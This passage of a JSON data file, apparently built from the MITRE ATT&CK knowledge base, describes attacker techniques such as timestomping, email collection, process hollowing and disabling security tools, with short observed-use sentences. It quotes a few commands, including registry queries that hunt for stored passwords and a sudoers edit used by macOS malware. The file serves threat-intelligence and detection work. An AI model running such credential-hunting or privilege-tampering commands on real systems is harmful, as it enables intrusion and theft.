      "The  malware supports timestomping.",
      "Several  malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.",
      "has performed timestomping on victim files."
    ],
    "id": "T1099",
    "name": "Timestomp",
    "similar_words": [
      "Timestomp"
    ]
  },
  "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce": {
    "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",
    "example_uses": [
      "used batch scripts to enumerate administrators in the environment.",
      "gathers information about local groups and members.",
      "collects lists of local accounts with administrative access, local group user accounts, and domain local groups with the commands net localgroup administrators, net localgroup users, and net localgroup /domain.",
      "has the capability to retrieve information about groups.",
      "can obtain the victim user name.",
      "has used net group /domain, net localgroup administrators, net group “domain admins” /domain, and net group “Exchange Trusted Subsystem” /domain to find group permission settings on a victim.",
      "may collect permission group information by running net group /domain or a series of other commands on a victim.",
      "has a tool that can enumerate the permissions associated with Windows groups.",
      "has checked for the local admin group domain admin group and Exchange Trusted Subsystem groups using the commands net group Exchange Trusted Subsystem /domain and net group domain admins /domain.",
      "specifically looks for Domain Admins, Power Users, and the Administrators groups within the domain and locally",
      "collects the group name of the logged-in user and sends it to the C2.",
      "has the capability to execute the command net localgroup administrators.",
      "Commands such as net group and net localgroup can be used in  to gather information about and manipulate groups.",
      "can be used to gather information on permission groups within a domain.",
      "actors used the following command following exploitation of a machine with  malware to list local groups: net localgroup administrator >> %temp%\\download",
      "performs discovery of permission groups net group /domain.",
      "used net group commands to enumerate various Windows user groups and permissions.",
      "has the ability to identify Workgroup membership.",
      "uses the net group command.",
      "During the   used the `Get-ManagementRoleAssignment` PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.",
      "can identify the groups the user on a compromised host belongs to.",
      "has used TinyMet to enumerate members of privileged groups.  has also run net group /domain.",
      "gathered the local privileges for the infected host.",
      "checks for Kubernetes node permissions.",
      "has enumerated all users and roles from a victim's main treasury system.",
      "has used commercial tools LOTL utilities and appliances already present on the system for group and user discovery."
    ],
    "id": "T1069",
    "name": "Permission Groups Discovery",
    "similar_words": [
      "Permission Groups Discovery"
    ]
  },
  "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f": {
    "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward email from mail servers or clients. ",
    "example_uses": [
      "accessed email accounts using Outlook Web Access.",
      "has collected .PST archives.",
      "searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).",
      "used a tool called MailSniper to search through the Exchange server mailboxes for keywords.",
      "has collected emails from victim Microsoft Exchange servers.",
      "searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.",
      "used a .NET tool to dump data from Microsoft Exchange mailboxes.",
      "can interact with a victim’s Outlook session and look through folders and emails.",
      "collects address book information from Outlook.",
      "Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.",
      "searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.",
      "contains a command to collect and exfiltrate emails from Outlook.",
      "uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files, and MAPIGET steals email still on Exchange servers that has not yet been archived.",
      "has exfiltrated entire mailboxes from compromised accounts.",
      "has been observed leveraging a module that can scrape email addresses from Outlook.",
      "has compromised email credentials in order to steal sensitive data.",
      "attempts to collect mail from accessed systems and servers.",
      "Scattered Spider threat actors search the victims Microsoft Exchange for emails about the intrusion and incident response.",
      "has exfiltrated collected email addresses to the C2 server.",
      "searched the victims Microsoft Exchange for emails about the intrusion and incident response."
    ],
    "id": "T1114",
    "name": "Email Collection",
    "similar_words": [
      "Email Collection"
    ]
  },
  "attack-pattern--18d4ab39-12ed-4a16-9fdb-ae311bba4a0f": {
    "description": "During the boot process, macOS executes source /etc/rc.common, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.\n\nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).",
    "example_uses": [
      "adds an entry to the rc.common file for persistence."
    ],
    "id": "T1163",
    "name": "Rc.common",
    "similar_words": [
      "Rc.common"
    ]
  },
  "attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec": {
    "description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",
    "example_uses": [
      "copies files with certain extensions from USB devices to\na predefined directory.",
      "steals files based on an extension list if a USB drive is connected to the system.",
      "has a package that collects documents from any inserted USB sticks.",
      "searches for files on attached removable drives based on a predefined list of file extensions every five seconds.",
      "contains a module to collect data from removable drives.",
      "steals user files from removable media with file extensions and keywords that match a predefined list.",
      "searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by .",
      "contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.",
      "Once a removable media device is inserted back into the first victim,  collects data from it that was exfiltrated from a second victim.",
      "A  file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.",
      "An  backdoor may collect the entire contents of an inserted USB device.",
      "Once a removable media device is inserted back into the first victim  collects data from it that was exfiltrated from a second victim.",
      "can collect jpeg files from connected MTP devices.",
      "has the ability to collect data from USB devices.",
      "can scan all .exe files located in the USB drive.",
      "A  file stealer has the capability to steal data from newly connected logical volumes on a system including USB drives.",
      "copies files with certain extensions from USB devices toa predefined directory.",
      "can monitor removable drives and exfiltrate files matching a given extension list.",
      "can find encrypt and upload files from fixed and removable drives.",
      "has the ability to extract data from removable devices connected to the endpoint.",
      "RPC backdoors can collect files from USB thumb drives.",
      "has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.",
      "can find and collect data from removable media devices.",
      "The  FilePakMonitor component has the ability to collect files from removable devices.",
      "can collect data from removable media and stage it for exfiltration.",
      "includes modules capable of gathering information from USB thumb drives and CD-ROMs on the victim machine given a list of provided criteria.",
      "has used Wiresharks usbcapcmd utility to capture USB traffic."
    ],
    "id": "T1025",
    "name": "Data from Removable Media",
    "similar_words": [
      "Data from Removable Media"
    ]
  },
  "attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d": {
    "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
    "example_uses": [
      "has signed  payloads with legally purchased code signing certificates.  has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.",
      "uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.",
      "Some  samples were signed with a stolen digital certificate.",
      "is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.",
      "A  .dll file is digitally signed by a certificate from AirVPN.",
      "The  client has been signed by fake and invalid digital certificates.",
      "has used stolen code signing certificates used to sign malware.",
      "is digitally signed by Microsoft.",
      "has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”",
      "drops a signed Microsoft DLL to disk.",
      "digitally signed an executable with a stolen certificate from legitimate company AI Squared.",
      "versions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\"",
      "samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.",
      "used a valid AppleDeveloperID to sign the code to get past security restrictions.",
      "samples have been signed with a code-signing certificates.",
      "samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.",
      "has used valid digital certificates from Sysprint AG to sign its  dropper.",
      "stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.",
      "used stolen certificates to sign its malware.",
      "has used stolen certificates to sign its malware.",
      "has used forged Microsoft code-signing certificates on malware.",
      "has used code-signing certificates on its malware that are either forged due to weak keys or stolen."
    ],
    "id": "T1116",
    "name": "Code Signing",
    "similar_words": [
      "Code Signing"
    ]
  },
  "attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21": {
    "description": "Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process Injection July 2017)",
    "example_uses": [
      "malware can use process hollowing to inject one of its trojans into another process.",
      "has used process hollowing in iexplore.exe to load the  implant.",
      "has been launched by starting iexplore.exe and replacing it with 's payload.",
      "Some  versions have an embedded DLL known as MockDll that uses process hollowing and  to execute another payload.",
      "spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.",
      "can use process hollowing for execution.",
      "hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.",
      "has a command to download an .exe and use process hollowing to inject it into a new process.",
      "has been seen loaded into msiexec.exe through process hollowing to hide its execution.",
      "is capable of loading executable code via process hollowing.",
      "A  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe."
    ],
    "id": "T1093",
    "name": "Process Hollowing",
    "similar_words": [
      "Process Hollowing"
    ]
  },
  "attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd": {
    "description": "Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
    "example_uses": [
      "has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.",
      "uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended desitnation."
    ],
    "id": "T1172",
    "name": "Domain Fronting",
    "similar_words": [
      "Domain Fronting"
    ]
  },
  "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d": {
    "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
    "example_uses": [
      "MISC::AddSid module can appended any SID or user/group account to a user's SID-History.  also utilizes  to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain."
    ],
    "id": "T1178",
    "name": "SID-History Injection",
    "similar_words": [
      "SID-History Injection"
    ]
  },
  "attack-pattern--1f47e2fd-fa77-4f2f-88ee-e85df308f125": {
    "description": "A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in C:\\Windows\\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",
    "example_uses": [],
    "id": "T1013",
    "name": "Port Monitors",
    "similar_words": [
      "Port Monitors"
    ]
  },
  "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba": {
    "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons).",
    "example_uses": [
      "has sent emails with URLs pointing to malicious documents.",
      "has sent spearphising emails with malicious links to potential victims.",
      "used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.",
      "sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.",
      "attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.",
      "has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.",
      "sent spear phishing emails containing links to .hta files.",
      "has distributed targeted emails containing links to malicious documents with embedded macros.",
      "has used spearphishing with links to deliver files with exploits to initial victims. The group has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.",
      "sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.",
      "has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",
      "has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files."
    ],
    "id": "T1192",
    "name": "Spearphishing Link",
    "similar_words": [
      "Spearphishing Link"
    ]
  },
  "attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302": {
    "description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nAdversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)",
    "example_uses": [],
    "id": "T1121",
    "name": "Regsvcs/Regasm",
    "similar_words": [
      "Regsvcs/Regasm"
    ]
  },
  "attack-pattern--2169ba87-1146-4fc7-a118-12b72251db7e": {
    "description": "The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout that is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nAdversaries can abuse poor configurations of this to escalate privileges without needing the user's password. /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. When tty_tickets is disabled, adversaries can do this from any tty for that user. \n\nThe OSX Proton Malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers  (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",
    "example_uses": [
      "modifies the tty_tickets line in the sudoers file."
    ],
    "id": "T1206",
    "name": "Sudo Caching",
    "similar_words": [
      "Sudo Caching"
    ]
  },
  "attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7": {
    "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules, anti-virus, and virtualization. These checks may be built into early-stage remote access tools.\n\n### Windows\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), reg query with [Reg](https://attack.mitre.org/software/S0075), dir with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\n\n### Mac\n\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.",
    "example_uses": [
      "probes the system to check for sandbox/virtualized environments and other antimalware processes.",
      "attempts to detect several anti-virus products.",
      "enumerates running processes to search for Wireshark and Windows Sysinternals suite.",
      "uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.",
      "can obtain information on installed anti-malware programs.",
      "uses WMI to check for anti-virus software installed on the system.",
      "checks for sandboxing libraries and debugging tools.",
      "performs several anti-VM and sandbox checks on the victim's machine.",
      "checks for anti-malware products and processes.",
      "installer searches the Registry and system to see if specific antivirus tools are installed on the system.",
      "checks for ant-sandboxing software such as virtual PC, sandboxie, and VMware.",
      "has detected security tools.",
      "has used Registry keys to detect and avoid executing in potential sandboxes.",
      "checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.",
      "checks for processes associated with anti-virus vendors.",
      "may collect information the victim's anti-virus software.",
      "checks for the presence of Bitdefender security software.",
      "has the ability to identify any anti-virus installed on the infected system.",
      "can obtain information about security software on the victim.",
      "A module in  collects information from the victim about installed anti-virus software.",
      "checks for the existence of anti-virus.",
      "identifies security software such as antivirus through the Security module.",
      "The  crimeware toolkit has refined its detection of sandbox analysis environments by inspecting the process list and Registry.",
      "contains a command to collect information about anti-virus software on the victim.",
      "The main  dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit. Newer versions of  will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.",
      "has a plugin to detect active drivers of some security products.",
      "performs checks for various antivirus and security products during installation.",
      "has the ability to scan for security tools such as firewalls and antivirus tools.",
      "checks for anti-virus, forensics, and virtualization software.",
      "can be used to enumerate security software currently running on a system by process name of known products.",
      "can be used to discover system firewall settings.",
      "scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).",
      "uses commands such as netsh advfirewall firewall to discover local firewall settings."
    ],
    "id": "T1063",
    "name": "Security Software Discovery",
    "similar_words": [
      "Security Software Discovery"
    ]
  },
  "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c": {
    "description": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
    "example_uses": [
      "has functionality to copy itself to network shares.",
      "copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.",
      "uses a virus that propagates by infecting executables stored on shared drives.",
      "used a virus that propagates by infecting executables stored on shared drives.",
      "can spread itself by infecting other portable executable files on networks shared drives.",
      "has injected malicious macros into all Word and Excel documents on mapped network drives.",
      "has placed malware on file shares and given it the same name as legitimate documents on the share.",
      "can replace legitimate software or documents in the compromised network with their trojanized versions in an attempt to propagate itself within the network.",
      "has deployed ransomware from a batch file in a network share.",
      "can spread itself by infecting other remote machines via network shared drives.",
      "infects remote servers via network shares and by infecting WinCC database views with malicious code.",
      "has copied itself to and infected files in network drives for propagation.",
      "has placed modified LNK files on network drives for lateral movement."
    ],
    "id": "T1080",
    "name": "Taint Shared Content",
    "similar_words": [
      "Taint Shared Content"
    ]
  },
  "attack-pattern--2715c335-1bf2-4efe-9f18-0691317ff83b": {
    "description": "In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)\n\nIf an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)",
    "example_uses": [
      "uses the keychaindump project to read securityd memory."
    ],
    "id": "T1167",
    "name": "Securityd Memory",
    "similar_words": [
      "Securityd Memory"
    ]
  },
  "attack-pattern--2892b9ee-ca9f-4723-b332-0dc6e843a8ae": {
    "description": "Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. (Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.exe is located in C:\\Windows\\System32\\ along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:\n\n* SCRNSAVE.exe - set to malicious PE path\n* ScreenSaveActive - set to '1' to enable the screensaver\n* ScreenSaverIsSecure - set to '0' to not require a password to unlock\n* ScreenSaverTimeout - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)",
    "example_uses": [
      "can establish persistence through the system screensaver by configuring it to execute the malware."
    ],
    "id": "T1180",
    "name": "Screensaver",
    "similar_words": [
      "Screensaver"
    ]
  },
  "attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f": {
    "description": "Per Apple’s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.",
    "example_uses": [],
    "id": "T1165",
    "name": "Startup Items",
    "similar_words": [
      "Startup Items"
    ]
  },
  "attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53": {
    "description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)",
    "example_uses": [
      "has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\\Software\\Microsoft\\Office test\\Special\\Perf to execute code.",
      "have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.",
      "has inserted malicious macros into existing documents providing persistence when they are reopened.  has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option once the Application.Startup event is received."
    ],
    "id": "T1137",
    "name": "Office Application Startup",
    "similar_words": [
      "Office Application Startup"
    ]
  },
  "attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044": {
    "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",
    "example_uses": [
      "has disabled host-based firewalls. The group has also globally opened port 3389.",
      "terminates anti-malware processes if they’re found running on the system.",
      "disables the Windows firewall before binding to a port.",
      "kills antimalware running process.",
      "opens the Windows Firewall to modify incoming connections.",
      "terminates antimalware processes.",
      "malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.",
      "kills security tools like Wireshark that are running.",
      "has a command to disable routing and the Firewall on the victim’s machine.",
      "can open the Windows Firewall on the victim’s machine to allow incoming connections.",
      "lower disable security settings by changing Registry keys.",
      "can change Internet Explorer settings to reduce warnings about malware activity.",
      "can disable Microsoft Office Protected View by changing Registry keys.",
      "can disable Avira anti-virus.",
      "can alter the victim's proxy configuration.",
      "The \"ZR\" variant of  will check to see if known host-based firewalls are installed on the infected systems.  will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.",
      "kills anti-virus found on the victim.",
      "has the ability to change firewall settings to allow a plug-in to be downloaded.",
      "has used appcmd.exe to disable logging on a victim server.",
      "kills and disables services for Windows Firewall, Windows Security Center, and Windows Defender.",
      "identifies and kills anti-malware processes.",
      "has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.",
      "can be used to disable local firewall settings.",
      "can add or remove applications or ports on the Windows firewall or disable it entirely.",
      "Various  malware modifies the Windows firewall to allow incoming connections or disable it entirely using .  malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally,  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.",
      "Malware used by  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).",
      "may use  to add local firewall rule exceptions."
    ],
    "id": "T1089",
    "name": "Disabling Security Tools",
    "similar_words": [
      "Disabling Security Tools"
    ]
  },
  "attack-pattern--2edd9d6a-5674-4326-a600-ba56de467286": {
    "description": "The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: reg query HKLM /f password /t REG_SZ /s\n* Current User Hive: reg query HKCU /f password /t REG_SZ /s",
    "example_uses": [
      "has several modules that search the Windows Registry for stored credentials: Get-UnattendedInstallFile, Get-Webconfig, Get-ApplicationHost, Get-SiteListPassword, Get-CachedGPPPassword, and Get-RegistryAutoLogon.",
      "may be used to find credentials in the Windows Registry."
    ],
    "id": "T1214",
    "name": "Credentials in Registry",
    "similar_words": [
      "Credentials in Registry"
    ]
  },
  "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619": {
    "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",
    "example_uses": [
      "used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.",
